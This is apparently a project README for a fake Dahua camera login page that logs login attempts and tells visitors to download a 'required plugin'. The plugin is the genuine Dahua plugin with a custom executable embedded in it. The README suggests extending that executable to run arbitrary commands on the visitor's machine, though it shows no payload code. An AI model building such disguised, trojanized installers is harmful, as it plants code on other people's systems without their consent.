# Camera Login Page Honeypot

This project sets up a honeypot for a camera login page that tricks attackers into downloading a malicious plugin. When an attacker attempts to log in, their request is logged, and they are shown an error message indicating that a plugin is not installed. The plugin they are prompted to download is a combination of a custom executable and the original Dahua web plugin.

## Features

- **Honeypot Login Page**: Logs the attacker's login attempt.
- **Plugin Error Message**: Displays an error message if the plugin is not installed.
- **Malicious Plugin**: A combined executable that includes our custom code and the original Dahua web plugin.
- **Dockerized Backend**: Uses a Python backend running in Docker to prevent attackers from gaining further access.

## Requirements

- Docker
- Python 3.x
- Git

## Setup

1. **Clone the Repository**

   ```bash
   git clone https://github.com/anand101285/camera-login-honeypot.git
   cd camera-login-honeypot
   ```

2. **Build and Run the Python backend using Docker Container**

   ```bash
   docker build -t camera-honeypot .
   docker run -p 5000:5000 camera-honeypot
   ```

3. **Embed Executable in Plugin**

   You can merge an executable file with any C# code using the following GitHub repository: [embed-a-exe-inside-exe](https://github.com/Jhangju/embed-a-exe-inside-exe).

   ```bash
   git clone https://github.com/Jhangju/embed-a-exe-inside-exe.git
   cd embed-a-exe-inside-exe
   # Follow the instructions in the repository to embed your custom executable inside the Dahua web plugin.
   ```

## Logging Attacker Requests

The backend will log all login attempts by attackers. You can view the logs by accessing the container and previewing logs.json file:

## Plugin Error Message

When an attacker tries to log in, they will see the following error message:

```
Warning! Plugin not installed. Please download and install the required plugin.
```

## Combining Custom Code with Dahua Web Plugin

You can customize the behavior of the plugin by modifying the C# code and combining it with the Dahua web plugin using the `embed-a-exe-inside-exe` repository. The current implementation includes simple print statements, but you can expand it to execute any command on the attacker's system.

## Security Notice

This project is for educational and research purposes only. Use it responsibly and only on systems you own or have explicit permission to test.
